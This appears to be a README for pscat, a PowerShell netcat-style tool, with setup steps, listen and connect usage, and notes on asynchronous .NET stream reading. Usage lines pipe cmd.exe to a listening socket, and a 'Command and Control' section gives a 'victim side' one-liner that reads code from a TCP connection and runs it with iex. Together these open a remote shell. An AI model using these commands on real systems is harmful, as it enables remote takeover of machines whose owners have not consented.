# pscat

PowerShell has many extremely useful features, but we want to harness the best ones. We can leverage our knowledge and create a tool kit designed to interact over the network. Normally these tasks are tricky, so here is the showcase of what is possible.

There are many ways to interact of the network, and for our choice, we are choosing **Asynchronous Execution**.

### **Setup**

```powershell
git clone https://github.com/SilentisVox/pscat
cd pscat
. ./pscat.ps1
```

### **Usage**

```powershell
# Listen Mode
pscat -Listen -Port 4444

# Connect Mode
pscat -Connect -Address 127.0.0.1 -Port 4444

# Pipe process
pscat -Listen -Port 4444 -Execute cmd.exe

# Pipeline data
"Hello, World!" | pscat -Listen -Port 4444

# Utilize Tcp Client
pscat -UtilizeGuest $TcpClient

# Help
pscat -Help

# OR
pc -l -p 4444
pc -c 127.0.0.1 4444
pc -l -p 4444 -e cmd.exe
pc -h
```

```powershell
# Command and Control Via pscat
$Content = Get-Content pscat.ps1 | Out-String
$Payload = $Content + 'pc -u $TcpClient -e cmd.exe'
$Payload | pc -l -p 4444 -v

# From the Victims side
$TcpClient = [Net.Sockets.TcpClient]::new("127.0.0.1", 4444)
$Buffer = [Byte[]]::new(65535)
$Read = $TcpClient.GetStream().Read($Buffer, 0, $Buffer.Length)
$Data = [Text.Encoding]::ASCII.GetString($Buffer, 0, $Read)
iex $Data

# or
$t=[net.sockets.tcpclient]::new('127.0.0.1',4444);$b=[byte[]]::new(65535);$r=$t.getstream().read($b,0,65535);[text.encoding]::ascii.getstring($b,0,$r)|iex
```

## **Brief Explanation**

![pscat](assets/pscat.jpg)

### **Asynchronous Stream Reading**

The .NET framework offers an asynchronous reading operation `BeginRead()`, which immediately returns an `IAsyncResult`, where code can keep running as the operation continues to completion.

And with a simple structure, we should be able to handle and read streams very easily. This include a process' Standard Input/Output/Error base stream.

###### Stream Reading Operation

```powershell
# Our IO Stream
[IO.Stream]    $Stream

# Our byte array
[Byte[]]       $Buffer

# Our Reading operation
[IAsyncResult] $Stream.BeginRead($Buffer, 0, $Buffer.Length, $null, $null)
```

###### Stream Structure

```powershell
# A structure to organize streams, their buffers and operations
class stream
{
    [String]       $Name
    [IO.Stream]    $IOStream
    [Byte[]]       $Buffer
    [IAsyncResult] $AsyncResult
}
```
